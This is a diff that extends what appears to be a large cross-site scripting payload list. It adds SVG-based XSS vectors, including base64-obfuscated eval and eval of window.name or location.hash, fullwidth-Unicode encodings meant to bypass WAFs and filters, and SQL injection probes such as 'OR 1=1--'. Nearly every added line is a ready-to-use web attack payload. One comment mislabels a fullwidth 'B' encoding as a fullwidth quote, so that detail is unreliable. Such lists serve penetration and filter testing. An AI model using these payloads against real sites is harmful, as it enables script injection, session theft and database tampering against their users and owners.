@@ -1590,3 +1590,34 @@ x”</title><img src%3dx onerror%3dalert(1)>
 ¼script¾alert(¢XSS¢)¼/script¾
 ¼script¾alert(¢XSS¢)¼/script¾
 “ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
+<svg/onload=eval(atob('YWxlcnQoJ1hTUycp'))>
+<svg onload=eval(window.name)>
+<svg onload=eval(location.hash.slice(1))>
+"><svg onload=prompt(document.domain);>.png
+<svg><script>a<!>l<!>e<!>r<!>t<!>(<!>1<!>)</script></svg>
+<svg><foreignObject><iframe src="javascript:alert(1)"></iframe></foreignObject></svg>
+<svg><animate onbegin=alert(1) attributeName=x></animate></svg>
+<svg><script href="data:,alert(1)"></script></svg>
+<svg><use href="data:image/svg+xml,<svg xmlns=&quot;http://www.w3.org/2000/svg&quot; onload=alert(1)/>#x"></use></svg>
+# Content-Type text/html served as .svg — some viewers execute
+<html><body><script>alert(document.domain)</script></body></html>
+# ─── Unicode normalization bypass — apps that NFKC-fold AFTER the WAF/filter ───
+# Fullwidth Latin (U+FF00 block) canonicalizes to ASCII in many parsers.
+# Emit the encoded byte sequence; some WAFs whitelist %EF% but block <>"'.
+# Test: does %EF%BC%9Cscript%EF%BC%9E reflect as <script> in the DOM?
+%EF%BC%9Cscript%EF%BC%9Ealert(1)%EF%BC%9C/script%EF%BC%9E
+%EF%BC%9Csvg/onload=alert(1)%EF%BC%9E
+%EF%BC%9Cimg%20src=x%20onerror=alert(1)%EF%BC%9E
+%EF%BC%9Ca%20href=javascript%EF%BC%9Aalert(1)%EF%BC%9Eclick%EF%BC%9C/a%EF%BC%9E
+# Same idea, raw UTF-8 (for JSON bodies or where URL-encoding is stripped early)
+＜script＞alert(1)＜/script＞
+＜svg/onload=alert(1)＞
+# Fullwidth quote / apostrophe / backtick — for attribute-context escapes
+%EF%BC%A2onload=alert(1)%EF%BC%A2
+%EF%BC%87onload=alert(1)%EF%BC%87
+%EF%BD%80alert(1)%EF%BD%80
+# Combined: SQLi/SSTI probes where quotes are filtered
+%EF%BC%87 OR 1=1--
+%EF%BC%87)) OR 1=1--
+# Mixed-encoding — first fullwidth passes WAF, latter normalizes into a full tag
+%EF%BC%9Cscript%3Ealert(1)%3C/script%3E
